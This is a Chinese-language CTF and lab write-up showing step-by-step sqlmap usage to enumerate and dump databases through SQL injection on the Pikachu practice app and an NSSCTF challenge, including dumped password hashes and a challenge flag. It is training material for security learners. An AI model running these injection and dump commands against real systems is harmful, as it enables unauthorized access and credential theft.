---
# 通过sqlmap拿下数据库
有些题目sqlmap扫不出来(比如***1[极客大挑战 2019]LoveSQL 1***)       
解决办法：用burpsuite抓包，将请求包放在txt文件中，使用`-r txt文件路径`
```batch
python sqlmap.py -r 请求包.txt -dbs
```
再不行就可能是题目限制了关键词`(select, union, from, where等)`的使用，慢慢审计代码吧
## 以pikachu为例
### 数据库名
```batch
python sqlmap.py -u "http://localhost/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2" -dbs
```
```python
[18:08:19] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.39, PHP 5.6.9, PHP
back-end DBMS: MySQL >= 5.6
[18:08:19] [INFO] fetching database names
available databases [6]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] pikachu
[*] root
[*] sys

[18:08:19] [INFO] fetched data logged to text files under 'C:\Users\Administrator\AppData\Local\sqlmap\output\localhost'
```
拿到信息：
* MySQL >= 5.6
* Apache 2.4.39, PHP 5.6.9, PHP
* 数据库名
    * information_schema
    * mysql
    * performance_schema
    * pikachu
    * root
    * sys
### 当前数据库名
```batch
python sqlmap.py -u "http://localhost/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2" --current-db --batch
```
```python
[18:09:32] [INFO] fetching current database
current database: 'root'
```
拿到信息：
* 当前数据库名：root
### 列出表名
```batch
python sqlmap.py -u "http://localhost/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2" -D root -tables --batch
```
~~~sql
[18:10:18] [INFO] fetching tables for database: 'root'
Database: root
[5 tables]
+----------+
| member   |
| httpinfo |
| message  |
| users    |
| xssblind |
+----------+
~~~
### 列出列名
```batch
python sqlmap.py -u "http://localhost/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2" -D root -T users --columns --batch
```
```sql
[18:10:59] [INFO] fetching columns for table 'users' in database 'root'
Database: root
Table: users
[4 columns]
+----------+------------------+
| Column   | Type             |
+----------+------------------+
| level    | int(11)          |
| id       | int(10) unsigned |
| password | varchar(66)      |
| username | varchar(30)      |
+----------+------------------+
```
### 列出数据
```batch
python sqlmap.py -u "http://localhost/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2" -D root -T users -C username,password -dump --batch
```
```sql
[INFO18:12:04] cracked password '] [abc123INFO' for user '] current status: Manet... /test'
Database: root
Table: users
[3 entries]
+----------+-------------------------------------------+
| username | password                                  |
+----------+-------------------------------------------+
| admin    | e10adc3949ba59abbe56e057f20f883e (123456) |
| pikachu  | 670b14728ad9902aecba32e22fa4f6bd (000000) |
| test     | e99a18c428cb38d5f260853678922e03 (abc123) |
+----------+-------------------------------------------+
```
## [SWPUCTF 2021 新生赛]easy_sql
### 数据库名
```batch
python sqlmap.py -u "http://node4.anna.nssctf.cn:28145/?wllm=1" -dbs
```
```sql
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] test
[*] test_db
```
### 当前数据库名
```batch
python sqlmap.py -u "http://node4.anna.nssctf.cn:28145/?wllm=1" --current-db --batch
```
```sql
[18:28:26] [INFO] fetching current database
current database: 'test_db'
```
### 列出表名
```batch
python sqlmap.py -u "http://node4.anna.nssctf.cn:28145/?wllm=1" -D test_db -tables --batch
```
```sql
Database: test_db
[2 tables]
+---------+
| test_tb |
| users   |
+---------+
```
### 列出列名
```batch
D:\Desktop\sqlmap-1.8\sqlmap-1.8>python sqlmap.py -u "http://node4.anna.nssctf.cn:28145/?wllm=1" -D test_db -T test_tb --columns --batch
```
```sql
Database: test_db
Table: test_tb
[2 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| flag   | varchar(50) |
| id     | int(11)     |
+--------+-------------+
```
### 列出数据
```batch
python sqlmap.py -u "http://node4.anna.nssctf.cn:28145/?wllm=1" -D test_db -T test_tb --C flag -dump --batch
```
```sql
[18:30:48] [INFO] fetching entries of column(s) 'flag' for table 'test_tb' in database 'test_db'
Database: test_db
Table: test_tb
[1 entry]
+----------------------------------------------+
| flag                                         |
+----------------------------------------------+
| NSSCTF{3ece377d-0b31-4ea2-9fb4-8324d7cdeb83} |
+----------------------------------------------+
```
得到flag：NSSCTF{3ece377d-0b31-4ea2-9fb4-8324d7cdeb83}
## 总结
1. 先爆数据库名
```batch
python sqlmap.py -u "http://localhost/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2" -dbs
```
2. 指定数据库名爆表名
```batch
python sqlmap.py -u "http://localhost/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -tables
```
3. 指定表名爆列名
```batch
python sqlmap.py -u "http://localhost/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users --columns
```
4. 指定列名爆数据
```batch
python sqlmap.py -u "http://localhost/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users -C username,password -dump
```